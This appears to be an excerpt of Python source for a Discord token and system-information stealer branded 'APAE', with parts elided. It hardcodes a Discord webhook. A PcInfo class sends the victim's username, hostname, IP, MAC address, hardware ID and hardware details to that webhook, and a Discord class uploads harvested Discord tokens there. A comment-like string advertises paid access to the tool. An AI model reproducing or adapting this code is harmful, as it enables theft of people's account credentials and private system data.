...
__HOOK__ = "https://discord.com/api/webhooks/1056745324431016008/nE0MmSpOGsCVayx9hCxDHgiYj0mUu7vWjAL1uERn-pk4KjCQbuTqHO18Zuir-CHE26Ev"
...
def main(webhook: str):
    ...
    webhook.send(content=content, file=_file, avatar_url="https://esoumdesenho.files.wordpress.com/2021/06/serial-experiments-lain-review-14-10-2016-2.png?w=700", username="APAE")
...
class PcInfo:
    ...
    def get_inf(self, webhook):
        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
        embed = Embed(title="APAE", color=10038562)
        ...
        embed.add_field(
            name="System Info",
            value=f''' **Usuário:** `{username}`\n **Nome:** `{hostname}`\n **SISTEMA:** `{computer_os}`\n\n **IP:** `{ip}`\n **MAC:** `{mac}`\n **HWID:** `{hwid}`\n\n **CPU:** `{cpu.Name}`\n **GPU:** `{gpu.Name}`\n **RAM:** `{ram}GB`''',
            inline=False)
        embed.set_footer(text="https://discord.gg/apae")
        embed.set_thumbnail(url="https://esoumdesenho.files.wordpress.com/2021/06/serial-experiments-lain-review-14-10-2016-2.png?w=700")

        webhook.send(embed=embed, avatar_url="https://esoumdesenho.files.wordpress.com/2021/06/serial-experiments-lain-review-14-10-2016-2.png?w=700", username="APAE")
...
class Discord:
    ...
    def upload(self, webhook):
        ...
        for token in self.tokens:
            ...
            webhook.send(
                embed=embed,
                avatar_url="https://esoumdesenho.files.wordpress.com/2021/06/serial-experiments-lain-review-14-10-2016-2.png?w=700",
                username="APAE")
...
class Debug:
    ...
    def get_network(self) -> bool:
        ...
        github = "https://discord.gg/apae (procure por epy e compre acesso)"
